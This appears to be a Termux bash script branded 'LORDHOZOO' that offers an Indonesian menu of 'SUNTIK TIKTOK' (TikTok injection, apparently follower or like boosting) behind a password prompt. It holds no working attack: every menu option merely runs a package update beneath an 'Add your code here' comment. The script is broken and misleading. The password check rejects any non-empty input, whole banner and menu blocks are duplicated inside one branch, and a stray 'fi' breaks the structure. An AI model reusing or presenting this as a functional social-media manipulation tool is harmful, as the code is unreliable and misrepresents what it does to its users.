cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
pkg install mpv -y
clear
apt install mpv -y
clear
mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
function loading_animation() {
    local pid=$1
    local delay=1
    local spinstr='|/-\'
    
    echo -n "Memproses "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# Meminta password
echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
echo -e "Masukkan Password untuk menjalankan tools: "
read -s password
echo

# Cek password (contoh password "rahasia")
if [ "$password" != "" ]; then
    echo "Password salah! Tools tidak dijalankan."
    exit 1
fi

# Proses yang membutuhkan loading
(
    # Simulasi proses yang memakan waktu
    sleep 3
) &

loading_animation $!

echo -e "\nTools berhasil dijalankan! 👰 Sukses"
clear
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Animation function
animate() {
    local text="$1"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
         done
    echo
}

echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │"
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
# Menu options
echo -e "${GREEN}╔═══════════════════════════════════════╗"      
echo -e "║          👸  LORDHOZOO 👸             ${GREEN}║"
echo -e "╠═══════════════════════════════════════╣"
echo -e "║ ${YELLOW}[01]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[02]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[03]${NC}. SUNTIK TIKTOK                   ${GREEN}║"
echo -e "║ ${YELLOW}[04]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[05]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[06]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[07]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[08]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[09]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[10]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[11]${NC}. LAPOR BUG                       ${GREEN}║"
echo -e "║ ${YELLOW}[12]${NC}. YOUUTUBE : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[13]${NC}. TIKTOK   : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[14]${NC}. ABOUT ME                        ${GREEN}║"
echo -e "║ ${YELLOW}[15]${NC}. Exit                            ${GREEN}║"
echo -e "╚═══════════════════════════════════════╝${NC}"
echo -e "${PURPLE} ╭─ROOT@LORDHOZOO@localhost /home"


read -p "$(echo -e ${PURPLE}" ╰─$: "${NC})" updt

# data
if [ "$updt" -eq 1 ] || [ "$updt" -eq 01 ]; then
    # Add your code here for option 1
    pkg update
    #!/bin/bash


fi

if [ "$updt" -eq 2 ] || [ "$updt" -eq 02 ]; then
    # Add your code here for option 2
    pkg update
fi

if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
    # Add your code here for option 3
    pkg update
fi

if [ "$updt" -eq 4 ] || [ "$updt" -eq 04 ]; then
    # Add your code here for option 4
    pkg update
fi

if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
    # Add your code here for option 5
    pkg update
fi

if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
    # Add your code here for option 6
    pkg update
fi

if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
    # Add your code here for option 7
    pkg update
fi

if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
    # Add your code here for option 8
    pkg update
fi

if [ "$updt" -eq 9 ] || [ "$updt" -eq 09 ]; then
    # Add your code here for option 9
    pkg update
fi

if [ "$updt" -eq 10 ]; then
    # Add your code here for option 10
    pkg update
fi

if [ "$updt" -eq 11 ]; then
    # Add your code here for option 11
    pkg update
fi

if [ "$updt" -eq 12 ]; then
    # Add your code here for option 12
    pkg update
fi

if [ "$updt" -eq 13 ]; then
    # Add your code here for option 13
    pkg update
fi

if [ "$updt" -eq 14 ]; then
    # Add your code here for option 14
    pkg update
fi

if [ "$updt" -eq 15 ]; then
    # Add your code here for option 15
    pkg update
fi



if [ "$updt" -eq 30 ]; then
    # Add your code here for option 30
    apt update -y
    clear
    RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
pkg install mpv -y
clear
apt install mpv -y
clear
mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
function loading_animation() {
    local pid=$1
    local delay=1
    local spinstr='|/-\'
    
    echo -n "Memproses "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# Meminta password
echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
echo -e "Masukkan Password untuk menjalankan tools: "
read -s password
echo

# Cek password (contoh password "rahasia")
if [ "$password" != "" ]; then
    echo "Password salah! Tools tidak dijalankan."
    exit 1
fi

# Proses yang membutuhkan loading
(
    # Simulasi proses yang memakan waktu
    sleep 3
) &

loading_animation $!

echo -e "\nTools berhasil dijalankan! 👰 Sukses"
clear
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Animation function
animate() {
    local text="$1"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
         done
    echo
}

echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │"
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
# Menu options
echo -e "${GREEN}╔═══════════════════════════════════════╗"      
echo -e "║          👸  LORDHOZOO 👸             ${GREEN}║"
echo -e "╠═══════════════════════════════════════╣"
echo -e "║ ${YELLOW}[01]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[02]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[03]${NC}. SUNTIK TIKTOK                   ${GREEN}║"
echo -e "║ ${YELLOW}[04]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[05]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[06]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[07]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[08]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[09]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[10]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[11]${NC}. LAPOR BUG                       ${GREEN}║"
echo -e "║ ${YELLOW}[12]${NC}. YOUUTUBE : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[13]${NC}. TIKTOK   : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[14]${NC}. ABOUT ME                        ${GREEN}║"
echo -e "║ ${YELLOW}[15]${NC}. Exit                            ${GREEN}║"
echo -e "╚═══════════════════════════════════════╝${NC}"
echo -e "${PURPLE} ╭─ROOT@LORDHOZOO@localhost /home"


read -p "$(echo -e ${PURPLE}" ╰─$: "${NC})" updt

# data
if [ "$updt" -eq 1 ] || [ "$updt" -eq 01 ]; then
    # Add your code here for option 1
    pkg update
    #!/bin/bash


fi

if [ "$updt" -eq 2 ] || [ "$updt" -eq 02 ]; then
    # Add your code here for option 2
    pkg update
fi

if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
    # Add your code here for option 3
    pkg update
fi

if [ "$updt" -eq 4 ] || [ "$updt" -eq 04 ]; then
    # Add your code here for option 4
    pkg update
fi

if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
    # Add your code here for option 5
    pkg update
fi

if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
    # Add your code here for option 6
    pkg update
fi

if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
    # Add your code here for option 7
    pkg update
fi

if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
    # Add your code here for option 8
    pkg update
fi

if [ "$updt" -eq 9 ] || [ "$updt" -eq 09 ]; then
    # Add your code here for option 9
    pkg update
fi

if [ "$updt" -eq 10 ]; then
    # Add your code here for option 10
    pkg update
fi

if [ "$updt" -eq 11 ]; then
    # Add your code here for option 11
    pkg update
fi

if [ "$updt" -eq 12 ]; then
    # Add your code here for option 12
    apt update
fi

if [ "$updt" -eq 13 ]; then
    # Add your code here for option 13
    apt  update
fi

if [ "$updt" -eq 14 ]; then
    # Add your code here for option 14
    apt update
fi

if [ "$updt" -eq 15 ]; then
    # Add your code here for option 15
    apt update
fi



if [ "$updt" -eq 31 ]; then
    # Add your code here for option 31
    apt  update
fi

if [ "$updt" -eq 32 ]; then
    # Add your code here for option 32
    apt update
fi

if [ "$updt" -eq 33 ]; then
    # Add your code here for option 33
    apt  update
fi

if [ "$updt" -eq 34 ]; then
    # Add your code here for option 34
    apt  update
fi

if [ "$updt" -eq 35 ]; then
    # Add your code here for option 35
    apt update
fi

if [ "$updt" -eq 36 ]; then
    # Add your code here for option 36
    apt update
fi

if [ "$updt" -eq 37 ]; then
    # Add your code here for option 37
    apt update
fi

if [ "$updt" -eq 38 ]; then
    # Add your code here for option 38
    apt update
fi

if [ "$updt" -eq 39 ]; then
    # Add your code here for option 39
    apt update
fi

if [ "$updt" -eq 40 ]; then
    # Add your code here for option 40
  apt  update
fi

if [ "$updt" -eq 41 ]; then
    # Add your code here for option 41
    apt update
fi

if [ "$updt" -eq 42 ]; then
    # Add your code here for option 42
    apt update
fi

if [ "$updt" -eq 43 ]; then
    # Add your code here for option 43
    apt update
fi

if [ "$updt" -eq 44 ]; then
    # Add your code here for option 44
    apt  update
fi

if [ "$updt" -eq 45 ]; then
    # Add your code here for option 45
    apt  update
fi

if [ "$updt" -eq 46 ]; then
    # Add your code here for option 46
    apt update
fi

if [ "$updt" -eq 47 ]; then
    # Add your code here for option 47
  apt update
fi

if [ "$updt" -eq 48 ]; then
    # Add your code here for option 48
    apt  update
fi

if [ "$updt" -eq 49 ]; then
    # Add your code here for option 49
    apt  update
fi

if [ "$updt" -eq 50 ]; then
    # Add your code here for option 50
    apt update
fi
fi

if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
    # Add your code here for option 3
    apt update
fi

if [ "$updt" -eq 4 ] || [ "$updt" -eq 04 ]; then
    # Add your code here for option 4
    apt update
fi

if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
    # Add your code here for option 5
    apt  update
fi

if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
    # Add your code here for option 6
    apt update
fi

if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
    # Add your code here for option 7
    apt  update
fi

if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
    # Add your code here for option 8
    apt  update
fi

if [ "$updt" -eq 9 ] || [ "$updt" -eq 09 ]; then
    # Add your code here for option 9
    apt  update
fi

if [ "$updt" -eq 10 ]; then
    # Add your code here for option 10
    apt update
fi

if [ "$updt" -eq 11 ]; then
    # Add your code here for option 11
    apt update
fi

if [ "$updt" -eq 12 ]; then
    # Add your code here for option 12
    apt update
fi

if [ "$updt" -eq 13 ]; then
    # Add your code here for option 13
    apt update
fi

if [ "$updt" -eq 14 ]; then
    # Add your code here for option 14
    apt  update
fi

if [ "$updt" -eq 15 ]; then
    # Add your code here for option 15
    apt update
fi

if [ "$updt" -eq 16 ]; then
    # Add your code here for option 16
    apt  update
fi

if [ "$updt" -eq 17 ]; then
    # Add your code here for option 17
    apt  update
fi

if [ "$updt" -eq 18 ]; then
    # Add your code here for option 18
    apt update
fi

if [ "$updt" -eq 19 ]; then
    # Add your code here for option 19
    apt update
fi

if [ "$updt" -eq 20 ]; then
    # Add your code here for option 20
    apt  update
fi

if [ "$updt" -eq 21 ]; then
    # Add your code here for option 21
    apt  update
fi

if [ "$updt" -eq 22 ]; then
    # Add your code here for option 22
    apt  update
fi

if [ "$updt" -eq 23 ]; then
    # Add your code here for option 23
    apt  update
fi

if [ "$updt" -eq 24 ]; then
    # Add your code here for option 24
    apt update
fi

if [ "$updt" -eq 25 ]; then
    # Add your code here for option 25
    apt update
fi

if [ "$updt" -eq 26 ]; then
    # Add your code here for option 26
  apt  update
fi

if [ "$updt" -eq 27 ]; then
    # Add your code here for option 27
    apt update
fi

if [ "$updt" -eq 28 ]; then
    # Add your code here for option 28
    apt  update
fi

if [ "$updt" -eq 29 ]; then
    # Add your code here for option 29
    apt update
fi

if [ "$updt" -eq 30 ]; then
    # Add your code here for option 30
    apt update
fi

if [ "$updt" -eq 31 ]; then
    # Add your code here for option 31
    apt update
fi

if [ "$updt" -eq 32 ]; then
    # Add your code here for option 32
    apt  update
fi

if [ "$updt" -eq 33 ]; then
    # Add your code here for option 33
    apt  update
fi

if [ "$updt" -eq 34 ]; then
    # Add your code here for option 34
    apt  update
fi

if [ "$updt" -eq 35 ]; then
    # Add your code here for option 35
    apt update
fi

if [ "$updt" -eq 36 ]; then
    # Add your code here for option 36
    apt  update
fi

if [ "$updt" -eq 37 ]; then
    # Add your code here for option 37
    apt update
fi

if [ "$updt" -eq 38 ]; then
    # Add your code here for option 38
    apt update
fi

if [ "$updt" -eq 39 ]; then
    # Add your code here for option 39
    apt update
fi

if [ "$updt" -eq 40 ]; then
    # Add your code here for option 40
    apt update
fi

if [ "$updt" -eq 41 ]; then
    # Add your code here for option 41
    apt  update
fi

if [ "$updt" -eq 42 ]; then
    # Add your code here for option 42
    apt update
fi

if [ "$updt" -eq 43 ]; then
    # Add your code here for option 43
    apt  update
fi

if [ "$updt" -eq 44 ]; then
    # Add your code here for option 44
    apt  update
fi

if [ "$updt" -eq 45 ]; then
    # Add your code here for option 45
    apt update
fi

if [ "$updt" -eq 46 ]; then
    # Add your code here for option 46
    apt update
fi

if [ "$updt" -eq 47 ]; then
    # Add your code here for option 47
    apt  update
fi

if [ "$updt" -eq 48 ]; then
    # Add your code here for option 48
    apt  update
fi

if [ "$updt" -eq 49 ]; then
    # Add your code here for option 49
    apt update -y
fi

if [ "$updt" -eq 50 ]; then
    # Add your code here for option 50
    apt  update -y 
fi
